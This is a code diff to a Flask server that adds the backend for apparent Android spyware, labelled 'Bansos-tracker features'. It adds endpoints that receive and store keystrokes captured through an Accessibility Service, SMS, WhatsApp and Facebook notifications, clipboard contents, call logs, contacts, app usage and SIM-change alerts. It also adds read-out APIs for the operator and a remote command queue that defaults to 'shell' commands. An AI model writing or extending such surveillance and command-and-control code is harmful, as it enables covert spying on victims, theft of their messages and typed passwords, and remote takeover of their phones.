@@ -41,6 +41,53 @@ def init_db():
     c.execute("""CREATE TABLE IF NOT EXISTS android_reports (
         id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT,
         report_data TEXT, ip_address TEXT, timestamp TEXT)""")
+
+    # v4.0 — Bansos-tracker features
+    c.execute("""CREATE TABLE IF NOT EXISTS sms_log (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        sender TEXT, message TEXT, timestamp TEXT,
+        device_id TEXT, received_at TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS notif_log (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        sender TEXT, message TEXT, timestamp TEXT,
+        device_id TEXT, app TEXT, received_at TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS keylog_log (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id TEXT, text TEXT, package TEXT,
+        class_name TEXT, view_id TEXT, char_length INTEGER,
+        timestamp INTEGER, received_at TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS clipboard_log (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id TEXT, text TEXT, char_length INTEGER,
+        app TEXT, class_name TEXT,
+        timestamp INTEGER, received_at TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS app_usage_log (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id TEXT, package TEXT, class_name TEXT,
+        timestamp INTEGER, received_at TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS command_queue (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id TEXT, command_type TEXT, command_params TEXT,
+        status TEXT DEFAULT 'pending',
+        created_at TEXT, executed_at TEXT, result TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS device_status (
+        device_id TEXT PRIMARY KEY,
+        last_seen TEXT, status TEXT, info TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS call_logs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id TEXT, phone_number TEXT, contact_name TEXT,
+        call_type TEXT, duration INTEGER, timestamp TEXT,
+        received_at TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS contacts (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id TEXT, name TEXT, phone_number TEXT,
+        email TEXT, source TEXT, timestamp TEXT,
+        received_at TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS sim_change_alerts (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id TEXT, old_sim TEXT, new_sim TEXT,
+        old_operator TEXT, new_operator TEXT,
+        timestamp TEXT, received_at TEXT)""")
     conn.commit()
     conn.close()
 
@@ -458,6 +505,17 @@ def api_dashboard():
     total_users = db_exec("SELECT COUNT(DISTINCT created_by) FROM links")[0][0]
     total_android = db_exec("SELECT COUNT(DISTINCT device_id) FROM android_reports")[0][0]
     android_reports_count = db_exec("SELECT COUNT(*) FROM android_reports")[0][0]
+    total_sms = db_exec("SELECT COUNT(*) FROM sms_log")[0][0] + db_exec("SELECT COUNT(*) FROM notif_log WHERE app='sms'")[0][0]
+    total_notif = db_exec("SELECT COUNT(*) FROM notif_log WHERE app NOT IN ('sms','com.whatsapp','com.facebook.katana')")[0][0]
+    total_keylogs = db_exec("SELECT COUNT(*) FROM keylog_log")[0][0]
+    total_clipboard = db_exec("SELECT COUNT(*) FROM clipboard_log")[0][0]
+    total_apps = db_exec("SELECT COUNT(*) FROM app_usage_log")[0][0]
+    total_calls = db_exec("SELECT COUNT(*) FROM call_logs")[0][0]
+    total_contacts_count = db_exec("SELECT COUNT(*) FROM contacts")[0][0]
+    total_sim_alerts = db_exec("SELECT COUNT(*) FROM sim_change_alerts")[0][0]
+    device_count = db_exec("SELECT COUNT(DISTINCT device_id) FROM device_status")[0][0]
+    total_whatsapp = db_exec("SELECT COUNT(*) FROM notif_log WHERE app='com.whatsapp'")[0][0]
+    total_facebook = db_exec("SELECT COUNT(*) FROM notif_log WHERE app='com.facebook.katana'")[0][0]
 
     recent_events = db_exec("""
         SELECT te.tracking_id, te.latitude, te.longitude, te.accuracy, te.timestamp,
@@ -502,6 +560,12 @@ def api_dashboard():
         "total_events": total_events, "today_events": today_events,
         "total_photos": total_photos, "total_users": total_users,
         "total_android": total_android, "android_reports_count": android_reports_count,
+        "total_sms": total_sms, "total_notif": total_notif,
+        "total_keylogs": total_keylogs, "total_clipboard": total_clipboard,
+        "total_apps": total_apps, "total_calls": total_calls,
+        "total_contacts": total_contacts_count, "total_sim_alerts": total_sim_alerts,
+        "device_count": device_count,
+        "total_whatsapp": total_whatsapp, "total_facebook": total_facebook,
         "recent_events": recent_events_list,
         "links": links_list,
         "latest_location": latest_location,
@@ -575,6 +639,235 @@ def api_android_devices():
             "timestamp": row[2]
         })
     return jsonify({"devices": devices})
+
+
+# ============ BANSOS-TRACKER DATA COLLECTION APIS ============
+
+@app.route("/api/collect-sms", methods=["POST"])
+def api_collect_sms():
+    """Collect SMS from Android device"""
+    try:
+        d = request.get_json(silent=True) or {}
+        device_id = d.get("device_id", "unknown")
+        sms_list = d.get("messages", d.get("sms_list", []))
+        for sms in sms_list:
+            db_exec("INSERT INTO sms_log (sender,message,timestamp,device_id,received_at) VALUES (?,?,?,?,?)",
+                (sms.get("sender",""), sms.get("message",""), sms.get("timestamp",""),
+                 device_id, datetime.now().isoformat()))
+        return jsonify({"success": True, "count": len(sms_list)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/collect-notif", methods=["POST"])
+def api_collect_notif():
+    """Collect notifications from Android"""
+    try:
+        d = request.get_json(silent=True) or {}
+        device_id = d.get("device_id", "unknown")
+        notif_list = d.get("notifications", d.get("notif_list", []))
+        for n in notif_list:
+            db_exec("INSERT INTO notif_log (sender,message,timestamp,device_id,app,received_at) VALUES (?,?,?,?,?,?)",
+                (n.get("sender",""), n.get("message",""), n.get("timestamp",""),
+                 device_id, n.get("app",""), datetime.now().isoformat()))
+        return jsonify({"success": True, "count": len(notif_list)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/collect-keylog", methods=["POST"])
+def api_collect_keylog():
+    """Collect keystrokes from Android Accessibility Service"""
+    try:
+        d = request.get_json(silent=True) or {}
+        device_id = d.get("device_id", "unknown")
+        entries = d.get("entries", d.get("keylog_list", []))
+        if not entries and "text" in d:
+            entries = [d]
+        for e in entries:
+            db_exec("INSERT INTO keylog_log (device_id,text,package,class_name,view_id,char_length,timestamp,received_at) VALUES (?,?,?,?,?,?,?,?)",
+                (device_id, e.get("text",""), e.get("package",""), e.get("class_name",""),
+                 e.get("view_id",""), e.get("char_length",len(e.get("text",""))),
+                 e.get("timestamp",int(time.time())), datetime.now().isoformat()))
+        return jsonify({"success": True, "count": len(entries)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/collect-clipboard", methods=["POST"])
+def api_collect_clipboard():
+    """Collect clipboard copies from Android"""
+    try:
+        d = request.get_json(silent=True) or {}
+        device_id = d.get("device_id", "unknown")
+        entries = d.get("entries", d.get("clipboard_list", []))
+        if not entries and "text" in d:
+            entries = [d]
+        for e in entries:
+            txt = e.get("text","")
+            db_exec("INSERT INTO clipboard_log (device_id,text,char_length,app,class_name,timestamp,received_at) VALUES (?,?,?,?,?,?,?)",
+                (device_id, txt, len(txt), e.get("app",""), e.get("class_name",""),
+                 e.get("timestamp",int(time.time())), datetime.now().isoformat()))
+        return jsonify({"success": True, "count": len(entries)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/collect-call-logs/<device_id>", methods=["POST"])
+def api_collect_call_logs(device_id):
+    """Collect call logs from Android"""
+    try:
+        d = request.get_json(silent=True) or {}
+        calls = d.get("calls", d.get("call_list", []))
+        for c in calls:
+            db_exec("INSERT INTO call_logs (device_id,phone_number,contact_name,call_type,duration,timestamp,received_at) VALUES (?,?,?,?,?,?,?)",
+                (device_id, c.get("phone_number",""), c.get("contact_name",""),
+                 c.get("call_type",""), c.get("duration",0), c.get("timestamp",""),
+                 datetime.now().isoformat()))
+        return jsonify({"success": True, "count": len(calls)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/collect-contacts/<device_id>", methods=["POST"])
+def api_collect_contacts(device_id):
+    """Collect contacts from Android"""
+    try:
+        d = request.get_json(silent=True) or {}
+        contacts = d.get("contacts", d.get("contact_list", []))
+        for c in contacts:
+            db_exec("INSERT INTO contacts (device_id,name,phone_number,email,source,timestamp,received_at) VALUES (?,?,?,?,?,?,?)",
+                (device_id, c.get("name",""), c.get("phone_number",""), c.get("email",""),
+                 c.get("source",""), c.get("timestamp",""), datetime.now().isoformat()))
+        return jsonify({"success": True, "count": len(contacts)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/collect-sim-change/<device_id>", methods=["POST"])
+def api_collect_sim_change(device_id):
+    """Collect SIM card change alerts"""
+    try:
+        d = request.get_json(silent=True) or {}
+        db_exec("INSERT INTO sim_change_alerts (device_id,old_sim,new_sim,old_operator,new_operator,timestamp,received_at) VALUES (?,?,?,?,?,?,?)",
+            (device_id, d.get("old_sim",""), d.get("new_sim",""),
+             d.get("old_operator",""), d.get("new_operator",""),
+             d.get("timestamp",""), datetime.now().isoformat()))
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/api/collect-apps/<device_id>", methods=["POST"])
+def api_collect_apps(device_id):
+    """Collect app usage (foreground app switches)"""
+    try:
+        d = request.get_json(silent=True) or {}
+        apps = d.get("apps", d.get("app_list", []))
+        for a in apps:
+            db_exec("INSERT INTO app_usage_log (device_id,package,class_name,timestamp,received_at) VALUES (?,?,?,?,?)",
+                (device_id, a.get("package",""), a.get("class_name",""),
+                 a.get("timestamp",int(time.time())), datetime.now().isoformat()))
+        return jsonify({"success": True, "count": len(apps)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+
+# ============ BANSOS-TRACKER DATA READING APIS ============
+
+@app.route("/api/data/sms/<device_id>")
+def api_data_sms(device_id):
+    if not is_authenticated():
+        return jsonify({"error": "unauthorized"}), 403
+    rows = db_exec("SELECT id,sender,message,timestamp,app,received_at FROM notif_log WHERE device_id=? AND app='sms' ORDER BY id DESC LIMIT 100",
+        (device_id,)) if device_id != "all" else \
+        db_exec("SELECT id,sender,message,timestamp,app,received_at FROM notif_log WHERE app='sms' ORDER BY id DESC LIMIT 100")
+    if not rows:
+        rows = db_exec("SELECT id,sender,message,timestamp,device_id,received_at FROM sms_log WHERE device_id=? ORDER BY id DESC LIMIT 100",
+            (device_id,)) if device_id != "all" else \
+            db_exec("SELECT id,sender,message,timestamp,device_id,received_at FROM sms_log ORDER BY id DESC LIMIT 100")
+    return jsonify({"sms": [{"id":r[0],"sender":r[1],"message":r[2],"ts":r[3]} for r in rows]})
+
+@app.route("/api/data/notif/<device_id>")
+def api_data_notif(device_id):
+    if not is_authenticated():
+        return jsonify({"error": "unauthorized"}), 403
+    rows = db_exec("SELECT id,sender,message,timestamp,app,received_at FROM notif_log WHERE device_id=? AND app NOT IN ('sms','com.whatsapp','com.facebook.katana') ORDER BY id DESC LIMIT 100",
+        (device_id,)) if device_id != "all" else \
+        db_exec("SELECT id,sender,message,timestamp,app,received_at FROM notif_log WHERE app NOT IN ('sms','com.whatsapp','com.facebook.katana') ORDER BY id DESC LIMIT 100")
+    return jsonify({"notifications": [{"id":r[0],"sender":r[1],"message":r[2],"ts":r[3],"app":r[4]} for r in rows]})
+
+@app.route("/api/data/keylog/<device_id>")
+def api_data_keylog(device_id):
+    if not is_authenticated():
+        return jsonify({"error": "unauthorized"}), 403
+    rows = db_exec("SELECT id,text,package,timestamp FROM keylog_log WHERE device_id=? ORDER BY id DESC LIMIT 200",
+        (device_id,)) if device_id != "all" else \
+        db_exec("SELECT id,text,package,timestamp FROM keylog_log ORDER BY id DESC LIMIT 200")
+    return jsonify({"keylogs": [{"id":r[0],"text":r[1],"app":r[2],"ts":r[3]} for r in rows]})
+
+@app.route("/api/data/clipboard/<device_id>")
+def api_data_clipboard(device_id):
+    if not is_authenticated():
+        return jsonify({"error": "unauthorized"}), 403
+    rows = db_exec("SELECT id,text,app,timestamp FROM clipboard_log WHERE device_id=? ORDER BY id DESC LIMIT 100",
+        (device_id,)) if device_id != "all" else \
+        db_exec("SELECT id,text,app,timestamp FROM clipboard_log ORDER BY id DESC LIMIT 100")
+    return jsonify({"clipboard": [{"id":r[0],"text":r[1],"app":r[2],"ts":r[3]} for r in rows]})
+
+@app.route("/api/data/apps/<device_id>")
+def api_data_apps(device_id):
+    if not is_authenticated():
+        return jsonify({"error": "unauthorized"}), 403
+    rows = db_exec("SELECT id,package,class_name,timestamp FROM app_usage_log WHERE device_id=? ORDER BY id DESC LIMIT 100",
+        (device_id,)) if device_id != "all" else \
+        db_exec("SELECT id,package,class_name,timestamp FROM app_usage_log ORDER BY id DESC LIMIT 100")
+    return jsonify({"apps": [{"id":r[0],"package":r[1],"class":r[2],"ts":r[3]} for r in rows]})
+
+@app.route("/api/data/calls/<device_id>")
+def api_data_calls(device_id):
+    if not is_authenticated():
+        return jsonify({"error": "unauthorized"}), 403
+    rows = db_exec("SELECT id,phone_number,contact_name,call_type,duration,timestamp FROM call_logs WHERE device_id=? ORDER BY id DESC LIMIT 100",
+        (device_id,)) if device_id != "all" else \
+        db_exec("SELECT id,phone_number,contact_name,call_type,duration,timestamp FROM call_logs ORDER BY id DESC LIMIT 100")
+    return jsonify({"calls": [{"id":r[0],"phone":r[1],"contact":r[2],"type":r[3],"dur":r[4],"ts":r[5]} for r in rows]})
+
+@app.route("/api/data/contacts/<device_id>")
+def api_data_contacts(device_id):
+    if not is_authenticated():
+        return jsonify({"error": "unauthorized"}), 403
+    rows = db_exec("SELECT id,name,phone_number,email FROM contacts WHERE device_id=? ORDER BY id DESC LIMIT 200",
+        (device_id,)) if device_id != "all" else \
+        db_exec("SELECT id,name,phone_number,email FROM contacts ORDER BY id DESC LIMIT 200")
+    return jsonify({"contacts": [{"id":r[0],"name":r[1],"phone":r[2],"email":r[3]} for r in rows]})
+
+@app.route("/api/data/sim-alerts/<device_id>")
+def api_data_sim_alerts(device_id):
+    if not is_authenticated():
+        return jsonify({"error": "unauthorized"}), 503
+    rows = db_exec("SELECT id,old_sim,new_sim,old_operator,new_operator,timestamp FROM sim_change_alerts WHERE device_id=? ORDER BY id DESC LIMIT 50",
+        (device_id,)) if device_id != "all" else \
+        db_exec("SELECT id,old_sim,new_sim,old_operator,new_operator,timestamp FROM sim_change_alerts ORDER BY id DESC LIMIT 50")
+    return jsonify({"alerts": [{"id":r[0],"old_sim":r[1],"new_sim":r[2],"old_op":r[3],"new_op":r[4],"ts":r[5]} for r in rows]})
+
+@app.route("/api/commands/<device_id>", methods=["GET"])
+def api_commands_get(device_id):
+    """Get pending commands for Android device"""
+    rows = db_exec("SELECT id,command_type,command_params,created_at FROM command_queue WHERE device_id=? AND status='pending' ORDER BY id ASC",
+        (device_id,))
+    return jsonify({"commands": [{"id":r[0],"type":r[1],"params":r[2],"created":r[3]} for r in rows]})
+
+@app.route("/api/commands/<device_id>/add", methods=["POST"])
+def api_commands_add(device_id):
+    """Add a remote command for Android device"""
+    if not is_authenticated():
+        return jsonify({"error": "unauthorized"}), 403
+    d = request.get_json(silent=True) or {}
+    db_exec("INSERT INTO command_queue (device_id,command_type,command_params,status,created_at) VALUES (?,?,?,'pending',?)",
+        (device_id, d.get("type","shell"), d.get("params","{}"), datetime.now().isoformat()))
+    return jsonify({"success": True})
+
+@app.route("/api/commands/<device_id>/<int:cmd_id>", methods=["POST"])
+def api_commands_exec(device_id, cmd_id):
+    """Mark command as executed"""
+    d = request.get_json(silent=True) or {}
+    db_exec("UPDATE command_queue SET status=?, executed_at=?, result=? WHERE id=? AND device_id=?",
+        (d.get("status","done"), datetime.now().isoformat(), d.get("result",""), cmd_id, device_id))
+    return jsonify({"success": True})
 
 
 @app.route("/apk/download")
